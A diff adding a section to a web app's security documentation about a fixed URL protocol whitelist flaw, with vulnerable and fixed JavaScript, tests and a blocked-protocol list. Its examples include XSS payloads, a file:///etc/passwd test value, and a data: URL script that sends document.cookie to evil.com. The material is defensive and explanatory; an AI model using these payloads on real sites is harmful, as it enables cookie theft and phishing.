@@ -1,7 +1,7 @@
 # Rhythm Chamber Security Documentation
 
 **Version:** 0.9.0
-**Last Updated:** 2026-01-30
+**Last Updated:** 2026-01-31
 **Status:** Comprehensive Security Reference
 
 ---
@@ -586,6 +586,131 @@ if (!SESSION_ID_PATTERN.test(sessionId)) {
     throw new Error('Invalid session ID format');
 }
 ```
+
+**4. URL Protocol Whitelist Validation (CRITICAL SECURITY FIX #2)**
+
+**Severity:** CRITICAL
+**Status:** FIXED ✅
+**Date Fixed:** 2026-01-31
+**Location:** `js/utils/validation/format-validators.js:91`
+
+**Vulnerability Description:**
+The JavaScript `URL` constructor accepts dangerous protocols like `javascript:`, `data:`, `vbscript:`, etc., which can lead to XSS attacks when user-controlled URLs are used in sensitive contexts like `<a href>` attributes or `location.href`.
+
+**Attack Example:**
+```javascript
+// ❌ VULNERABLE CODE (before fix)
+const url = new URL(userInput);  // Accepts "javascript:alert(1)"
+a.href = url.href;  // XSS!
+```
+
+**Fix Implementation:**
+```javascript
+// ✅ SECURE CODE (after fix)
+export function validateURL(url, options = {}) {
+    const { allowedProtocols = ['http:', 'https:'] } = options;
+
+    // Type validation
+    if (typeof url !== 'string') {
+        return { valid: false, error: 'URL must be a string' };
+    }
+
+    const trimmed = url.trim();
+
+    // SECURITY: Extract protocol BEFORE parsing to reject dangerous schemes
+    const protocolMatch = trimmed.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/);
+
+    if (!protocolMatch) {
+        return { valid: false, error: 'URL must include a protocol (e.g., https://)' };
+    }
+
+    const protocol = protocolMatch[1].toLowerCase() + ':';
+
+    // SECURITY: Strict protocol whitelist validation
+    if (!allowedProtocols.includes(protocol)) {
+        // Check for known dangerous protocols
+        const dangerousProtocols = ['javascript:', 'data:', 'vbscript:', 'file:', 'about:', 'chrome:', 'chrome-extension:'];
+
+        if (dangerousProtocols.includes(protocol)) {
+            return {
+                valid: false,
+                error: `Dangerous protocol "${protocol}" is not allowed for security reasons`
+            };
+        }
+
+        return {
+            valid: false,
+            error: `URL protocol "${protocol}" is not allowed. Allowed protocols are: ${allowedProtocols.join(', ')}`
+        };
+    }
+
+    // Now safe to parse with URL constructor
+    try {
+        const normalized = new URL(trimmed);
+        return { valid: true, normalizedValue: normalized.href };
+    } catch (e) {
+        return { valid: false, error: 'Invalid URL format' };
+    }
+}
+```
+
+**Key Security Features:**
+1. **Pre-validation**: Protocol is extracted and validated BEFORE the URL constructor is called
+2. **Strict whitelist**: Only explicitly allowed protocols are accepted (http:, https: by default)
+3. **Dangerous protocol detection**: Known dangerous protocols trigger specific error messages
+4. **Case-insensitive matching**: Protocols are normalized to lowercase for comparison
+5. **Clear error messages**: Developers get actionable feedback about security violations
+
+**Blocked Protocols:**
+- `javascript:` - Can execute arbitrary JavaScript (XSS)
+- `data:` - Can embed arbitrary HTML/JavaScript content (XSS)
+- `vbscript:` - Can execute VBScript (IE, legacy XSS risk)
+- `file:` - Can access local filesystem (privacy/security)
+- `about:` - Internal browser pages (phishing risk)
+- `chrome:`, `chrome-extension:` - Browser internals (privilege escalation)
+
+**Test Coverage:**
+```javascript
+// All dangerous protocols are blocked
+validateURL('javascript:alert(1)');  // { valid: false, error: "Dangerous protocol..." }
+validateURL('data:text/html,<script>alert(1)</script>');  // Blocked
+validateURL('vbscript:msgbox("XSS")');  // Blocked
+validateURL('file:///etc/passwd');  // Blocked
+
+// Safe protocols are accepted
+validateURL('https://example.com');  // { valid: true, normalizedValue: "https://example.com/" }
+validateURL('http://localhost:8080');  // { valid: true }
+```
+
+**Usage Example:**
+```javascript
+import { validateURL } from './utils/validation/format-validators.js';
+
+// Validate user input before using in sensitive context
+function setUserLink(userInput) {
+    const result = validateURL(userInput);
+
+    if (!result.valid) {
+        console.error('Invalid URL:', result.error);
+        return;
+    }
+
+    // Safe to use
+    linkElement.href = result.normalizedValue;
+}
+```
+
+**Why This Matters:**
+Without protocol whitelist validation, an attacker could submit:
+- `javascript:document.cookie` - Steal session cookies
+- `data:text/html,<script>fetch('https://evil.com?'+document.cookie)</script>` - Exfiltrate data
+- `javascript:window.location='https://evil.com/phishing'` - Redirect to phishing site
+
+**Defense in Depth:**
+This validation works alongside other XSS prevention measures:
+- Content Security Policy (CSP) blocks `javascript:` in most contexts
+- HTML escaping prevents XSS in DOM manipulation
+- Input validation provides an additional security layer
 
 ### 7.4 Content Security Policy
 
